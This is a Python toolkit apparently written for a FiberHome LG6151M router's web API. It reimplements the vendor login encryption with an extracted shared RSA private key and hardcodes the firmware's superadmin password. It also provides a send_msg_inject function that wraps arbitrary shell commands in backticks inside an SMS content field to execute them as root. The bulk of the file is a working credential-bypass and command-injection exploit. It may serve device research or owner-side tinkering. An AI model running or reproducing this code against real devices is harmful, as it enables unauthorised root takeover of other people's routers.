#!/usr/bin/env python3
"""FiberHome fh_api web API toolkit for LG6151M (firmware RP0102, OpenWrt-based).

Reproduces the vendor web login crypto:
  1. GET /fh_api/tmp/FHNCAPIS?ajaxmethod=is_encrypt
       -> {"data": <6 random junk chars (before OR after) + base64(RSA-256B)>}
       -> RSA-decrypt with the LG6851F/LG6151M shared private key -> 5-byte token
  2. GET .../get_refresh_sessionid -> sid
  3. AES-128-CBC key derived from (sid, token) via the vendor Lua algorithm
  4. POST encrypted hex payload (6 random prefix chars) to
     /fh_api/tmp/FHAPIS (authed) or FHNCAPIS

Node read format: {"alias": "<node.path>"} (see reference/xmlnode.js for paths).
Requires: openssl in PATH, pip install passlib (only for crack_root).
Personal values come from device_local.py (see device_local.py.example).
"""
import base64
import http.cookiejar
import json
import os
import random
import re
import subprocess
import sys
import tempfile
import urllib.request
import urllib.error

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import device_local as D

HOST = getattr(D, "HOST", "192.168.8.1")
WEB_USER = D.WEB_USER
WEB_PASS = D.WEB_PASS
# Firmware constants (same on every unit; also embedded in the public web JS):
SUPER_ADMIN = "superadmin"
SUPER_PASS = "F1ber$dm"
IV_HEX = "6f707172737475767778797a7b7c7d7e"
BASE = "http://" + HOST

# RSA private key as shipped in the device web bundle (same file the browser
# downloads). Kept in reference/ together with its origin (xxtg666's repo).
_REF = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "reference")
_src = open(os.path.join(_REF, "xxtg666", "sms.sh"), encoding="utf-8").read()
RSA_PEM = re.search(r"-----BEGIN RSA PRIVATE KEY-----.*?-----END RSA PRIVATE KEY-----", _src, re.S).group(0)
_fd, _pem_file = tempfile.mkstemp(suffix=".pem")
with os.fdopen(_fd, "w") as _f:
    _f.write(RSA_PEM + "\n")

jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def http(method, path, data=None, timeout=8):
    req = urllib.request.Request(BASE + path, data=data, method=method)
    req.add_header("X-Requested-With", "XMLHttpRequest")
    if data is not None:
        req.add_header("Content-Type", "application/json; charset=utf-8")
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return None, f"ERR: {e}"


def aes(data: bytes, key_hex: str, decrypt: bool) -> bytes:
    cmd = ["openssl", "enc"] + (["-d"] if decrypt else []) + \
          ["-aes-128-cbc", "-nosalt", "-K", key_hex, "-iv", IV_HEX]
    p = subprocess.run(cmd, input=data, capture_output=True)
    if p.returncode != 0:
        raise RuntimeError("openssl aes failed: " + p.stderr.decode("utf-8", "replace")[:200])
    return p.stdout


def rsa_token(data_b64: str) -> bytes:
    """is_encrypt data = 6 random junk chars (before OR after) + b64(RSA 256B block)."""
    eq = data_b64.find("==")
    s = data_b64[max(0, eq - 342):eq + 2] if eq != -1 else data_b64[-344:]
    blob = base64.b64decode(s)
    if len(blob) != 256:
        raise RuntimeError(f"unexpected block len {len(blob)}")
    p = subprocess.run(["openssl", "pkeyutl", "-decrypt", "-inkey", _pem_file,
                        "-pkeyopt", "rsa_padding_mode:pkcs1"],
                       input=blob, capture_output=True)
    if p.returncode != 0 or len(p.stdout) < 5:
        raise RuntimeError("rsa token decrypt failed: rc=%d err=%s" % (
            p.returncode, p.stderr.decode("utf-8", "replace")[:120]))
    return p.stdout


def derive_key_hex(sid: str, token: bytes) -> str:
    """Port of the vendor Lua derive_key_hex (1-based Lua -> 0-based python)."""
    special = {5, 7, 10, 11, 13}
    offset = (ord(sid[1]) % 3) - 1
    out, token_index = [], 1
    for i in range(16):
        if i in special:
            code = token[token_index - 1] + offset
            token_index += 1
        elif len(sid) > i * 4 + 2:
            code = ord(sid[len(sid) - 2 - i * 4]) - 1
        else:
            code = ord(sid[i * 4 - 31]) + 1
        out.append("%02x" % (code % 256))
    return "".join(out)


def encrypt_wire(plain: str, key_hex: str) -> str:
    cipher_hex = aes(plain.encode(), key_hex, decrypt=False).hex()
    prefix = "".join(random.choice("0123456789abcdefghijklmnopqrstuvwxyz") for _ in range(6))
    return prefix + cipher_hex


def decrypt_wire(raw: str, key_hex: str) -> str:
    raw = raw.strip().strip('"')
    hexpart = raw[6:]
    if not hexpart or any(c not in "0123456789abcdefABCDEF" for c in hexpart):
        return raw
    try:
        return aes(bytes.fromhex(hexpart), key_hex, decrypt=True).decode("utf-8", "replace")
    except Exception:
        return raw


def get_token_sid_key():
    _, body = http("GET", "/fh_api/tmp/FHNCAPIS?ajaxmethod=get_refresh_sessionid")
    sid = json.loads(body)["sessionid"]
    _, body = http("GET", "/fh_api/tmp/FHNCAPIS?ajaxmethod=is_encrypt")
    token = rsa_token(json.loads(body)["data"])
    return token, sid, derive_key_hex(sid, token)


def login(user=WEB_USER, password=WEB_PASS):
    """DO_WEB_LOGIN. Returns decrypted response JSON string."""
    token, sid, key = get_token_sid_key()
    plain = json.dumps({"dataObj": {"username": user, "password": password},
                        "ajaxmethod": "DO_WEB_LOGIN", "sessionid": sid}, separators=(",", ":"))
    st, resp = http("POST", f"/fh_api/sign/DO_WEB_LOGIN?_={random.random()}",
                    encrypt_wire(plain, key).encode())
    dec = decrypt_wire(resp, key)
    ok = '"result":0' in dec.replace(" ", "")
    return ok, dec


def call(method, dataobj, endpoint="/fh_api/tmp/FHAPIS", as_super=True):
    """Login (superadmin by default) + one encrypted API call."""
    login(SUPER_ADMIN, SUPER_PASS) if as_super else login()
    token, sid, key = get_token_sid_key()
    payload = json.dumps({"dataObj": dataobj, "ajaxmethod": method, "sessionid": sid},
                         separators=(",", ":"))
    st, resp = http("POST", f"{endpoint}?_={random.random()}",
                    encrypt_wire(payload, key).encode())
    return st, decrypt_wire(resp, key)


def send_msg_inject(command):
    """SMS content command injection (runs as uid=0 on RP0102).
    The vendor sms backend popen()s the content inside double quotes --
    backticks survive. Returns the send response."""
    payload = "x`" + command + "`x"
    return call("send_msg", {"recv_number": D.PHONE, "encode_schema": "GSM_8BIT",
                             "content": payload})


if __name__ == "__main__":
    print(login()[1][:200])
    print(call("get_value_by_xmlnode", {
        "sw": "DeviceInfo.SoftwareVersion",
        "model": "DeviceInfo.ModelName",
    }))
